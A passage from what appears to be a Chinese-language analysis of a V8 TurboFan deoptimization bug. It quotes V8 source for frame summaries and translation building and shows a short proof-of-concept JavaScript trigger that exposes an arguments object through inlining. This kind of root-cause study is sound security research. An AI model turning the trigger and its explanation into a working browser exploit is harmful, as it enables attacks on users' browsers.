</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      TranslatedFrame<span style="color:#f92672">::</span>iterator translated_values <span style="color:#f92672">=</span> it<span style="color:#f92672">-&gt;</span>begin();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Get or materialize the correct function in the optimized frame.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      Handle<span style="color:#f92672">&lt;</span>JSFunction<span style="color:#f92672">&gt;</span> function <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          Handle<span style="color:#f92672">&lt;</span>JSFunction<span style="color:#f92672">&gt;::</span>cast(translated_values<span style="color:#f92672">-&gt;</span>GetValue());
</span></span><span style="display:flex;"><span>      translated_values<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Get or materialize the correct receiver in the optimized frame.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> receiver <span style="color:#f92672">=</span> translated_values<span style="color:#f92672">-&gt;</span>GetValue();
</span></span><span style="display:flex;"><span>      translated_values<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Determine the underlying code object and the position within it from
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// the translation corresponding to the frame type in question.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      Handle<span style="color:#f92672">&lt;</span>AbstractCode<span style="color:#f92672">&gt;</span> abstract_code;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">unsigned</span> code_offset;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (it<span style="color:#f92672">-&gt;</span>kind() <span style="color:#f92672">==</span> TranslatedFrame<span style="color:#f92672">::</span>kJavaScriptBuiltinContinuation <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>          it<span style="color:#f92672">-&gt;</span>kind() <span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>              TranslatedFrame<span style="color:#f92672">::</span>kJavaScriptBuiltinContinuationWithCatch) {
</span></span><span style="display:flex;"><span>        code_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        abstract_code <span style="color:#f92672">=</span> ToAbstractCode(
</span></span><span style="display:flex;"><span>            isolate()<span style="color:#f92672">-&gt;</span>builtins()<span style="color:#f92672">-&gt;</span>code_handle(
</span></span><span style="display:flex;"><span>                Builtins<span style="color:#f92672">::</span>GetBuiltinFromBytecodeOffset(it<span style="color:#f92672">-&gt;</span>bytecode_offset())),
</span></span><span style="display:flex;"><span>            isolate());
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        DCHECK_EQ(it<span style="color:#f92672">-&gt;</span>kind(), TranslatedFrame<span style="color:#f92672">::</span>kUnoptimizedFunction);
</span></span><span style="display:flex;"><span>        code_offset <span style="color:#f92672">=</span> it<span style="color:#f92672">-&gt;</span>bytecode_offset().ToInt();
</span></span><span style="display:flex;"><span>        abstract_code <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>            handle(shared_info<span style="color:#f92672">-&gt;</span>abstract_code(isolate()), isolate());
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Append full summary of the encountered JS frame.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      Handle<span style="color:#f92672">&lt;</span>FixedArray<span style="color:#f92672">&gt;</span> params <span style="color:#f92672">=</span> GetParameters();
</span></span><span style="display:flex;"><span>      FrameSummary<span style="color:#f92672">::</span>JavaScriptFrameSummary summary(
</span></span><span style="display:flex;"><span>          isolate(), <span style="color:#f92672">*</span>receiver, <span style="color:#f92672">*</span>function, <span style="color:#f92672">*</span>abstract_code, code_offset,
</span></span><span style="display:flex;"><span>          is_constructor, <span style="color:#f92672">*</span>params);
</span></span><span style="display:flex;"><span>      frames<span style="color:#f92672">-&gt;</span>push_back(summary);
</span></span><span style="display:flex;"><span>      is_constructor <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (it<span style="color:#f92672">-&gt;</span>kind() <span style="color:#f92672">==</span> TranslatedFrame<span style="color:#f92672">::</span>kConstructStub) {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// The next encountered JS frame will be marked as a constructor call.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      DCHECK(<span style="color:#f92672">!</span>is_constructor);
</span></span><span style="display:flex;"><span>      is_constructor <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>可以看到这个函数的代码量相对大了不少，这是因为 turbofan 生成的代码经过了各种优化，有些函数可能被内联，有些本来会保存在栈上的数据被优化掉了，在栈回溯的时候，就要把这些信息恢复回去。turbofan 在生成优化代码的时候，就已经考虑到了逆优化的场景，把需要的信息都已经存到了 Deoptimization 结构中，这个函数就是在遍历 Deoptimization 数据，恢复栈帧的原貌。</p>
<p>对于 POC 代码来说，通过 turbolizer 查看 tubofan 的 trace 可以发现下面三个函数被内联成一个。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>function <span style="color:#a6e22e">opt</span>(a,b,c) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(typeof a <span style="color:#f92672">===</span><span style="color:#960050;background-color:#1e0010">&#39;</span>number<span style="color:#960050;background-color:#1e0010">&#39;</span>){
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">if</span>(a<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">2</span>){
</span></span><span style="display:flex;"><span>		    <span style="color:#66d9ef">for</span>(vari<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">100</span>;i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>		        ;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		b.d(a,b,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>			g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;g<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>function <span style="color:#a6e22e">d</span>(a, b) {
</span></span><span style="display:flex;"><span>    use strict;
</span></span><span style="display:flex;"><span>    b.a.call(arguments, b);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> arguments[a];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>	    
</span></span><span style="display:flex;"><span>j.prototype.a <span style="color:#f92672">=</span> function (a) {
</span></span><span style="display:flex;"><span>    a.b(<span style="color:#ae81ff">0</span>, a);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><pre tabindex="0"><code>0 C
1 c
2 b
3 a
</code></pre><p>查找 translation_array 的来源，找到 <code>BuildTranslation</code> 函数</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-CPP" data-lang="CPP"><span style="display:flex;"><span>DeoptimizationExit<span style="color:#f92672">*</span> CodeGenerator<span style="color:#f92672">::</span>BuildTranslation(
</span></span><span style="display:flex;"><span>    Instruction<span style="color:#f92672">*</span> instr, <span style="color:#66d9ef">int</span> pc_offset, size_t frame_state_offset,
</span></span><span style="display:flex;"><span>    size_t immediate_args_count, OutputFrameStateCombine state_combine) {
</span></span><span style="display:flex;"><span>  DeoptimizationEntry <span style="color:#66d9ef">const</span><span style="color:#f92672">&amp;</span> entry <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      GetDeoptimizationEntry(instr, frame_state_offset);
</span></span><span style="display:flex;"><span>  FrameStateDescriptor<span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span> descriptor <span style="color:#f92672">=</span> entry.descriptor();
</span></span><span style="display:flex;"><span>  frame_state_offset<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">int</span> update_feedback_count <span style="color:#f92672">=</span> entry.feedback().IsValid() <span style="color:#f92672">?</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">int</span> translation_index <span style="color:#f92672">=</span> translations_.BeginTranslation(
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(descriptor<span style="color:#f92672">-&gt;</span>GetFrameCount()),
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(descriptor<span style="color:#f92672">-&gt;</span>GetJSFrameCount()), update_feedback_count);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (entry.feedback().IsValid()) {
</span></span><span style="display:flex;"><span>    DeoptimizationLiteral literal <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        DeoptimizationLiteral(entry.feedback().vector);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> literal_id <span style="color:#f92672">=</span> DefineDeoptimizationLiteral(literal);
</span></span><span style="display:flex;"><span>    translations_.AddUpdateFeedback(literal_id, entry.feedback().slot.ToInt());
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  InstructionOperandIterator <span style="color:#a6e22e">iter</span>(instr, frame_state_offset);
</span></span><span style="display:flex;"><span>  BuildTranslationForFrameStateDescriptor(descriptor, <span style="color:#f92672">&amp;</span>iter, state_combine);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  DeoptimizationExit<span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span> exit <span style="color:#f92672">=</span> zone()<span style="color:#f92672">-&gt;</span>New<span style="color:#f92672">&lt;</span>DeoptimizationExit<span style="color:#f92672">&gt;</span>(
</span></span><span style="display:flex;"><span>      current_source_position_, descriptor<span style="color:#f92672">-&gt;</span>bailout_id(), translation_index,
</span></span><span style="display:flex;"><span>      pc_offset, entry.kind(), entry.reason(),
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef DEBUG
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      entry.node_id());
</span></span><span style="display:flex;"><span><span style="color:#75715e">#else   </span><span style="color:#75715e">// DEBUG
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif  </span><span style="color:#75715e">// DEBUG
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Deoptimizer<span style="color:#f92672">::</span>kSupportsFixedDeoptExitSizes) {
</span></span><span style="display:flex;"><span>    exit<span style="color:#f92672">-&gt;</span>set_deoptimization_id(next_deoptimization_id_<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (immediate_args_count <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">auto</span> immediate_args <span style="color:#f92672">=</span> zone()<span style="color:#f92672">-&gt;</span>New<span style="color:#f92672">&lt;</span>ZoneVector<span style="color:#f92672">&lt;</span>ImmediateOperand<span style="color:#f92672">*&gt;&gt;</span>(zone());
</span></span><span style="display:flex;"><span>    InstructionOperandIterator <span style="color:#a6e22e">imm_iter</span>(
</span></span><span style="display:flex;"><span>        instr, frame_state_offset <span style="color:#f92672">-</span> immediate_args_count <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (size_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> immediate_args_count; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>      immediate_args<span style="color:#f92672">-&gt;</span>emplace_back(ImmediateOperand<span style="color:#f92672">::</span>cast(imm_iter.Advance()));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    exit<span style="color:#f92672">-&gt;</span>set_immediate_args(immediate_args);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  deoptimization_exits_.push_back(exit);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> exit;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> CodeGenerator<span style="color:#f92672">::</span>TranslateStateValueDescriptor(
</span></span><span style="display:flex;"><span>    StateValueDescriptor<span style="color:#f92672">*</span> desc, StateValueList<span style="color:#f92672">*</span> nested,
</span></span><span style="display:flex;"><span>    InstructionOperandIterator<span style="color:#f92672">*</span> iter) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (desc<span style="color:#f92672">-&gt;</span>IsNested()) {
</span></span><span style="display:flex;"><span>    translations_.BeginCapturedObject(<span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(nested<span style="color:#f92672">-&gt;</span>size()));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">auto</span> field : <span style="color:#f92672">*</span>nested) {
</span></span><span style="display:flex;"><span>      TranslateStateValueDescriptor(field.desc, field.nested, iter);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (desc<span style="color:#f92672">-&gt;</span>IsArgumentsElements()) {
</span></span><span style="display:flex;"><span>    translations_.ArgumentsElements(desc<span style="color:#f92672">-&gt;</span>arguments_type());
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (desc<span style="color:#f92672">-&gt;</span>IsArgumentsLength()) {
</span></span><span style="display:flex;"><span>    translations_.ArgumentsLength();
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (desc<span style="color:#f92672">-&gt;</span>IsDuplicate()) {
</span></span><span style="display:flex;"><span>    translations_.DuplicateObject(<span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(desc<span style="color:#f92672">-&gt;</span>id()));
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (desc<span style="color:#f92672">-&gt;</span>IsPlain()) {
</span></span><span style="display:flex;"><span>    InstructionOperand<span style="color:#f92672">*</span> op <span style="color:#f92672">=</span> iter<span style="color:#f92672">-&gt;</span>Advance();
</span></span><span style="display:flex;"><span>    AddTranslationForOperand(iter<span style="color:#f92672">-&gt;</span>instruction(), op, desc<span style="color:#f92672">-&gt;</span>type());
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    DCHECK(desc<span style="color:#f92672">-&gt;</span>IsOptimizedOut());
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (optimized_out_literal_id_ <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        optimized_out_literal_id_ <span style="color:#f92672">=</span> DefineDeoptimizationLiteral(
</span></span><span style="display:flex;"><span>            DeoptimizationLiteral(isolate()<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>optimized_out()));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      translations_.StoreLiteral(optimized_out_literal_id_);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>函数中用到了两个关键参数，<code>FrameStateDescriptor* const descriptor = entry.descriptor();</code> 和 <code>InstructionOperandIterator iter(instr, frame_state_offset);</code>，追踪这两个参数的来源，找到 <code>InstructionSelector::VisitDeoptimize</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-CPP" data-lang="CPP"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> InstructionSelector<span style="color:#f92672">::</span>VisitDeoptimize(DeoptimizeKind kind,
</span></span><span style="display:flex;"><span>                                          DeoptimizeReason reason,
</span></span><span style="display:flex;"><span>                                          NodeId node_id,
</span></span><span style="display:flex;"><span>                                          FeedbackSource <span style="color:#66d9ef">const</span><span style="color:#f92672">&amp;</span> feedback,
</span></span><span style="display:flex;"><span>                                          FrameState frame_state) {
</span></span><span style="display:flex;"><span>  InstructionOperandVector <span style="color:#a6e22e">args</span>(instruction_zone());
</span></span><span style="display:flex;"><span>  AppendDeoptimizeArguments(<span style="color:#f92672">&amp;</span>args, kind, reason, node_id, feedback,
</span></span><span style="display:flex;"><span>                            frame_state);
</span></span><span style="display:flex;"><span>  Emit(kArchDeoptimize, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">nullptr</span>, args.size(), <span style="color:#f92672">&amp;</span>args.front(), <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">nullptr</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> InstructionSelector<span style="color:#f92672">::</span>AppendDeoptimizeArguments(
</span></span><span style="display:flex;"><span>    InstructionOperandVector<span style="color:#f92672">*</span> args, DeoptimizeKind kind,
</span></span><span style="display:flex;"><span>    DeoptimizeReason reason, NodeId node_id, FeedbackSource <span style="color:#66d9ef">const</span><span style="color:#f92672">&amp;</span> feedback,
</span></span><span style="display:flex;"><span>    FrameState frame_state) {
</span></span><span style="display:flex;"><span>  OperandGenerator <span style="color:#a6e22e">g</span>(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>  FrameStateDescriptor<span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span> descriptor <span style="color:#f92672">=</span> GetFrameStateDescriptor(frame_state);
</span></span><span style="display:flex;"><span>  DCHECK_NE(DeoptimizeKind<span style="color:#f92672">::</span>kLazy, kind);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> <span style="color:#66d9ef">const</span> state_id <span style="color:#f92672">=</span> sequence()<span style="color:#f92672">-&gt;</span>AddDeoptimizationEntry(
</span></span><span style="display:flex;"><span>      descriptor, kind, reason, node_id, feedback);
</span></span><span style="display:flex;"><span>  args<span style="color:#f92672">-&gt;</span>push_back(g.TempImmediate(state_id));
</span></span><span style="display:flex;"><span>  StateObjectDeduplicator <span style="color:#a6e22e">deduplicator</span>(instruction_zone());
</span></span><span style="display:flex;"><span>  AddInputsToFrameStateDescriptor(descriptor, frame_state, <span style="color:#f92672">&amp;</span>g, <span style="color:#f92672">&amp;</span>deduplicator,
</span></span><span style="display:flex;"><span>                                  args, FrameStateInputKind<span style="color:#f92672">::</span>kAny,
</span></span><span style="display:flex;"><span>                                  instruction_zone());
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Returns the number of instruction operands added to inputs.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>size_t InstructionSelector<span style="color:#f92672">::</span>AddInputsToFrameStateDescriptor(
</span></span><span style="display:flex;"><span>    FrameStateDescriptor<span style="color:#f92672">*</span> descriptor, FrameState state, OperandGenerator<span style="color:#f92672">*</span> g,
</span></span><span style="display:flex;"><span>    StateObjectDeduplicator<span style="color:#f92672">*</span> deduplicator, InstructionOperandVector<span style="color:#f92672">*</span> inputs,
</span></span><span style="display:flex;"><span>    FrameStateInputKind kind, Zone<span style="color:#f92672">*</span> zone) {
</span></span><span style="display:flex;"><span>  size_t entries <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  size_t initial_size <span style="color:#f92672">=</span> inputs<span style="color:#f92672">-&gt;</span>size();
</span></span><span style="display:flex;"><span>  USE(initial_size);  <span style="color:#75715e">// initial_size is only used for debug.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (descriptor<span style="color:#f92672">-&gt;</span>outer_state()) {
</span></span><span style="display:flex;"><span>    entries <span style="color:#f92672">+=</span> AddInputsToFrameStateDescriptor(
</span></span><span style="display:flex;"><span>        descriptor<span style="color:#f92672">-&gt;</span>outer_state(), FrameState{state.outer_frame_state()}, g,
</span></span><span style="display:flex;"><span>        deduplicator, inputs, kind, zone);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Node<span style="color:#f92672">*</span> parameters <span style="color:#f92672">=</span> state.parameters();
</span></span><span style="display:flex;"><span>  Node<span style="color:#f92672">*</span> locals <span style="color:#f92672">=</span> state.locals();
</span></span><span style="display:flex;"><span>  Node<span style="color:#f92672">*</span> stack <span style="color:#f92672">=</span> state.stack();
</span></span><span style="display:flex;"><span>  Node<span style="color:#f92672">*</span> context <span style="color:#f92672">=</span> state.context();
</span></span><span style="display:flex;"><span>  Node<span style="color:#f92672">*</span> function <span style="color:#f92672">=</span> state.function();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  DCHECK_EQ(descriptor<span style="color:#f92672">-&gt;</span>parameters_count(),
</span></span><span style="display:flex;"><span>            StateValuesAccess(parameters).size());
</span></span><span style="display:flex;"><span>  DCHECK_EQ(descriptor<span style="color:#f92672">-&gt;</span>locals_count(), StateValuesAccess(locals).size());
</span></span><span style="display:flex;"><span>  DCHECK_EQ(descriptor<span style="color:#f92672">-&gt;</span>stack_count(), StateValuesAccess(stack).size());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  StateValueList<span style="color:#f92672">*</span> values_descriptor <span style="color:#f92672">=</span> descriptor<span style="color:#f92672">-&gt;</span>GetStateValueDescriptors();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  DCHECK_EQ(values_descriptor<span style="color:#f92672">-&gt;</span>size(), <span style="color:#ae81ff">0u</span>);
</span></span><span style="display:flex;"><span>  values_descriptor<span style="color:#f92672">-&gt;</span>ReserveSize(descriptor<span style="color:#f92672">-&gt;</span>GetSize());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  DCHECK_NOT_NULL(function);
</span></span><span style="display:flex;"><span>  entries <span style="color:#f92672">+=</span> AddOperandToStateValueDescriptor(
</span></span><span style="display:flex;"><span>      values_descriptor, inputs, g, deduplicator, function,
</span></span><span style="display:flex;"><span>      MachineType<span style="color:#f92672">::</span>AnyTagged(), FrameStateInputKind<span style="color:#f92672">::</span>kStackSlot, zone);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  entries <span style="color:#f92672">+=</span> AddInputsToFrameStateDescriptor(
</span></span><span style="display:flex;"><span>      values_descriptor, inputs, g, deduplicator, parameters, kind, zone);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (descriptor<span style="color:#f92672">-&gt;</span>HasContext()) {
</span></span><span style="display:flex;"><span>    DCHECK_NOT_NULL(context);
</span></span><span style="display:flex;"><span>    entries <span style="color:#f92672">+=</span> AddOperandToStateValueDescriptor(
</span></span><span style="display:flex;"><span>        values_descriptor, inputs, g, deduplicator, context,
</span></span><span style="display:flex;"><span>        MachineType<span style="color:#f92672">::</span>AnyTagged(), FrameStateInputKind<span style="color:#f92672">::</span>kStackSlot, zone);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  entries <span style="color:#f92672">+=</span> AddInputsToFrameStateDescriptor(values_descriptor, inputs, g,
</span></span><span style="display:flex;"><span>                                             deduplicator, locals, kind, zone);
</span></span><span style="display:flex;"><span>  entries <span style="color:#f92672">+=</span> AddInputsToFrameStateDescriptor(values_descriptor, inputs, g,
</span></span><span style="display:flex;"><span>                                             deduplicator, stack, kind, zone);
</span></span><span style="display:flex;"><span>  DCHECK_EQ(initial_size <span style="color:#f92672">+</span> entries, inputs<span style="color:#f92672">-&gt;</span>size());
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> entries;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>size_t InstructionSelector<span style="color:#f92672">::</span>AddInputsToFrameStateDescriptor(
</span></span><span style="display:flex;"><span>    StateValueList<span style="color:#f92672">*</span> values, InstructionOperandVector<span style="color:#f92672">*</span> inputs,
</span></span><span style="display:flex;"><span>    OperandGenerator<span style="color:#f92672">*</span> g, StateObjectDeduplicator<span style="color:#f92672">*</span> deduplicator, Node<span style="color:#f92672">*</span> node,
</span></span><span style="display:flex;"><span>    FrameStateInputKind kind, Zone<span style="color:#f92672">*</span> zone) {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// StateValues are often shared across different nodes, and processing them is
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// expensive, so cache the result of processing a StateValue so that we can
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// quickly copy the result if we see it again.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  FrameStateInput <span style="color:#a6e22e">key</span>(node, kind);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">auto</span> cache_entry <span style="color:#f92672">=</span> state_values_cache_.find(key);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (cache_entry <span style="color:#f92672">!=</span> state_values_cache_.end()) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Entry found in cache, emit cached version.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> cache_entry<span style="color:#f92672">-&gt;</span>second<span style="color:#f92672">-&gt;</span>Emit(inputs, values);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Not found in cache, generate and then store in cache if possible.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    size_t entries <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
